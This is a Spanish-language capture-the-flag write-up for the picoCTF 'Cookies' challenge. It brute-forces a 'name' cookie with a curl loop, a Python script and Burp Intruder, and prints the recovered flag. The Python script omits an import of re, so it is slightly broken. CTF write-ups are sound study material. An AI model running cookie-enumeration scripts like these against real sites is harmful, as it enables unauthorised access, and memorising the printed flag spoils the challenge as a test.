
## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ for i in {0..30}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep "picoCTF{"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
                           
```

## Código en python (exploit)
```python
import requests
 
url="http://mercury.picoctf.net:29649/check"
 
for i in range(20):
        print(i)
        cookies= {'name':f'{i}'}
        r = requests.get(url,cookies=cookies)
        if 'picoCTF{' in r.text:
                flag=re.findall('picoCTF\\{.*?\\}',r.text)[0]
                print(flag)


```

## Solucion 3
En burpsuite interceptamos la solicitud e ingresamos al intruder para configurar un payload
![[Pasted image 20240925212520.png]]

Y en la solicitud 18 obtenemos la respuesta
![[Pasted image 20240925212734.png]]
## Notas Adicionales

## Referencias